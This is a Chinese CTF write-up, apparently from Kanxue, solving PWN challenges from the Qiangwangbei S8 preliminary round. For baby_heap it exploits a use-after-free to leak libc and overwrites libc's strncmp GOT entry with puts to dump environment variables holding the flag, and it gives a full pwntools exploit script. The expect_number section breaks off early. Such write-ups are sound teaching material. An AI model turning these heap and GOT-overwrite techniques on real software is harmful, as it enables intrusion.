---
title: 强网杯S8初赛 PWN 赛题解析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458585618&idx=1&sn=2829f550700528e99809f3cd53994b6d&chksm=b18c3a9886fbb38e3db37f1738d486bb7a2f7262894cfed8e22cda8a0631fd6b919fa3e8ca95&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-12-10
fetch_date: 2025-10-06T19:39:53.988788
---

# 强网杯S8初赛 PWN 赛题解析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHRyGHXGwCUib9djZLLYjc6hFFeBSFkRhOXvL56ev9w8mKZ7OAbK2lVSw/0?wx_fmt=jpeg)

# 强网杯S8初赛 PWN 赛题解析

xi@0ji233

看雪学苑

本次强网杯初赛做出两道pwn题，把详细题解写一下记录。

## baby\_heap

附件下载

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHY4cMAbpibK6NS3GnOpvuibsFGmdhuatlYKDAjrKNria8x8xKCo0c5CvBA/640?wx_fmt=png&from=appmsg)

2.35 的版本，IDA打开，堆菜单题，经典增删改查之外，还有两个额外的操作，一个是环境变量，另一个是任意地址写 0x10 字节。

del 里面有很明显的UAF漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHFGaYYsV75NcqqvMUB3NTADC6TKcwkib0Zar2QIYCOmO8ald2GBdDB5g/640?wx_fmt=png&from=appmsg)

show 只有一次机会，但是可以同时将 libc 和堆地址一起泄露出来，只需要我们释放两个相同大小的堆块之后，bk\_nextsize 和 fd\_nextsize 上面就会携带堆的地址，然而我自己的做法中没有用到。

交互函数：

```
from pwn import *
context.log_level = "debug"
p=process("./pwn")
# p=remote('47.94.231.2',)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
    p.sendlineafter("choice:",str(ch))

def add(size):
    choice(1)
    p.sendlineafter('size',str(size))

def free(idx):
    choice(2)
    p.sendlineafter('delete:',str(idx))

def edit(idx, payload):
    choice(3)
    p.sendlineafter('edit:',str(idx))
    p.sendafter('content',content)

def show(idx):
    choice(4)
    p.sendlineafter('show:',str(idx))

def env(ch):
    choice(5)
    p.sendlineafter('sad !',str(ch))

def write(addr1,payload):
    choice(6)
    p.sendafter('addr',p64(addr1))
    p.send(payload)
```

先add出四个堆块，把 1 3 free 掉，再打印出 3 堆块的内容，即可连带泄露 libc 和堆地址。

```
add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)
```

运行结果。

注意到选项 6 并不是任意地址写，而是有一定限制的，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHzf27Jic0BQnGicKpBaQUyQPiaC49tLiaBrnXzc0rgnsITFFmRcbYTn6N8w/640?wx_fmt=png&from=appmsg)

这里说实话不知道是不是 IDA 解析有问题。因为理论上来说 stdin 是`FILE *`类型，占 8 字节，因此`&stdin[512]`等同于 stdin 的地址加上`512*8=4096=0x1000`，但是将视角调到汇编时会发现。。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHI6fThPRsVib8OicNd62vibjicV2jB1GNrLXfWRpNH72Cxtyhjb1yhvFvCg/640?wx_fmt=png&from=appmsg)

它往后加了 0x1b000 的地址，通常情况下，以汇编为准一定没问题（以上是做题时的想法），但是后来才发现犯了一个错误，stdin 的确是 FILE \* 类型的，但是`stdin[0]`是 FILE 类型的，直接的 stdin 是一个指向`_IO_2_1_stdin_`的指针，类型为 FILE，在 gdb 里面也很容易观察到这一点。

这里主要观察这个 &stdin[512] 与 stdin 的差值，以及可以发现，它所禁用的这个范围就是 libc`_IO_2_1_stdin_`之后的data 段，全部不允许写。

而另外一个条件就有意思了，不能超过 80 开头的一个地址，基本不会触发，所以目标很明确，让我们去写 libc`_IO_2_1_stdin_`之前的 data 段，或者是写堆段，程序段写不了因为没有办法泄露地址。

先考虑前者，来看看之前的 data 段存了哪些内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEH0IEuGQPPtZ8OaEu3qBRJsb1sZhXutoUn058AAI5OHH6C0MicTck6w3Q/640?wx_fmt=png&from=appmsg)

发现基本是 got 表，于是尝试输出看看 libc 的 got 表，发现都是跟字符串操作的相关函数。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHksRg7Xe1icBLCulsPMl5bRlVjtfcpycOWKoicpibobeRiaKpddyq62MBsA/640?wx_fmt=png&from=appmsg)

看来可以尝试在这里找一个函数作为跳板，能不能`one_gadget`呢？显然不能，这题有沙箱。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHvgupdYiaqohezHgpLOD1evV455o3aJ3Aria9x31kCC3omvaNzuJz6lWA/640?wx_fmt=png&from=appmsg)

除非你能找到一个 execveat 系统调用执行的`one_gadget`这题才能直接一键利用。

同时注意到选项 5 对环境变量的相关操作。

◆getenv

◆putenv

◆setenv

这里可以直接上 glibc 的源码。

```
char *
getenv (const char *name)
{
  char **ep;
  uint16_t name_start;

  if (__environ == NULL || name[0] == '\0')
    return NULL;

  if (name[1] == '\0')
    {
      /* The name of the variable consists of only one character.  Therefore
     the first two characters of the environment entry are this character
     and a '=' character.  */
#if __BYTE_ORDER == __LITTLE_ENDIAN || !_STRING_ARCH_unaligned
      name_start = ('=' << 8) | *(const unsigned char *) name;
#else
      name_start = '=' | ((*(const unsigned char *) name) << 8);
#endif
      for (ep = __environ; *ep != NULL; ++ep)
    {
#if _STRING_ARCH_unaligned
      uint16_t ep_start = *(uint16_t *) *ep;
#else
      uint16_t ep_start = (((unsigned char *) *ep)[0]
                   | (((unsigned char *) *ep)[1] << 8));
#endif
      if (name_start == ep_start)
        return &(*ep)[2];
    }
    }
  else
    {
      size_t len = strlen (name);
#if _STRING_ARCH_unaligned
      name_start = *(const uint16_t *) name;
#else
      name_start = (((const unsigned char *) name)[0]
            | (((const unsigned char *) name)[1] << 8));
#endif
      len -= 2;
      name += 2;

      for (ep = __environ; *ep != NULL; ++ep)
    {
#if _STRING_ARCH_unaligned
      uint16_t ep_start = *(uint16_t *) *ep;
#else
      uint16_t ep_start = (((unsigned char *) *ep)[0]
                   | (((unsigned char *) *ep)[1] << 8));
#endif

      if (name_start == ep_start && !strncmp (*ep + 2, name, len)
          && (*ep)[len + 2] == '=')
        return &(*ep)[len + 3];
    }
    }

  return NULL;
}
```

观察到最后一个循环中，它在遍历环境变量，并且使用 strncmp 这个函数，而这个函数恰好是在 got 表中的，如果尝试将其改为 puts，结果会如何呢？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEH8bMaxyQwCrZuH5nLbKtETr9tCxBPvkKPGXVlc65sNKicAP4yJOPHejw/640?wx_fmt=png&from=appmsg)

可以发现只输出了 USER 环境变量，而且前两位被去掉了，我们从头来分析这个源码看。因为我们入口是`getenv("USER")`，所以长度为 1 的判断就直接过掉，直接看 else 分支，似乎只有开头两个字符匹配到了，才会紧接着调用 strncmp，因此出现了只输出 USER 环境变量的问题。

但是当我选择选项 2 或 3 的时候，它输出了所有的环境变量。

也就是说不管是调用 putenv 还是 setenv，在劫持了 strncmp 函数之后都可以完美输出所有环境变量。

它们两个函数内部都调用了一个函数`__add_to_environ`。

函数源码跳楼（https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/setenv.c#L116）

```
int
__add_to_environ (const char *name, const char *value, const char *combined,
          int replace)
{
  char **ep;
  size_t size;

  /* Compute lengths before locking, so that the critical section is
     less of a performance bottleneck.  VALLEN is needed only if
     COMBINED is null (unfortunately GCC is not smart enough to deduce
     this; see the #pragma at the start of this file).  Testing
     COMBINED instead of VALUE causes setenv (..., NULL, ...)  to dump
     core now instead of corrupting memory later.  */
  const size_t namelen = strlen (name);
  size_t vallen;
  if (combined == NULL)
    vallen = strlen (value) + 1;

  LOCK;

  /* We have to get the pointer now that we have the lock and not earlier
     since another thread might have created a new environment.  */
  ep = __environ;

  size = 0;
  if (ep != NULL)
    {
      for (; *ep != NULL; ++ep)
    if (!strncmp (*ep, name, namelen) && (*ep)[namelen] == '=')
      break;
    else
      ++size;
    }
/*
中间省略很多代码，感兴趣可以直接去看完整源码
*/

  return 0;
}
```

通过分析这个函数的源码，可以发现这里会无条件地去遍历环境变量一次一次调用 strncmp 去判断，并且很幸运，第一个参数就是函数变量的指针，因此修改 strncmp 的 got 为 puts 函数，就可以输出所有的环境变量。

在远程环境中， flag 就在环境变量中。

总EXP：

```
from pwn import *
context.log_level = "debug"
p=process("./pwn")
# p=remote('47.94.231.2',)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
    p.sendlineafter("choice:",str(ch))

def add(size):
    choice(1)
    p.sendlineafter('size',str(size))

def free(idx):
    choice(2)
    p.sendlineafter('delete:',str(idx))

def edit(idx, payload):
    choice(3)
    p.sendlineafter('edit:',str(idx))
    p.sendafter('content',content)

def show(idx):
    choice(4)
    p.sendlineafter('show:',str(idx))

def env(ch):
    choice(5)
    p.sendlineafter('sad !',str(ch))

def write(addr1,payload):
    choice(6)
    p.sendafter('addr',p64(addr1))
    p.send(payload)

add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)

libc_addr=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x21ace0
success('libc_addr: '+hex(libc_addr))
write(libc_addr+0x21a118,p64(libc_addr+libc.sym['puts']))
env(2)
gdb.attach(p)
p.interactive()
```

---

第二种方法当然是可以用 Largebin Attack 去打，但是过于复杂，可能自己还没学会，主要在于分享自己的 EXP 和做题思路了，就不增加额外的工作量。

## expect\_number

附件下载（https://xia0ji233.pro/2024/11/07/qwb2024\_pre/expect\_number\_cf786f84f8b86260b7eac1628ad682a8.zip）

这题没给 libc，应该题目自己有提权或者是给 flag 的东西，运行它输出的话，需要让我们最终计算得到`0x4F5DA2`这个值。

也是一个很经典的菜单

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHRYYG9MSibcibDliacjHeyRDRILYmMzjcnMd6xDyAYayAsXsIewq3HF2tg/640?wx_fmt=png&from=appmsg)

选项 1 发现它会根据随机`1~4`之间的整数来判断当前对数字做四则运算，1、2、3、4 分别对应了加、减、乘、除，并且另一个运算的数字只能是 0 1 2。既然是随机，那么交叉一下 srand 函数看看它是用了什么种子...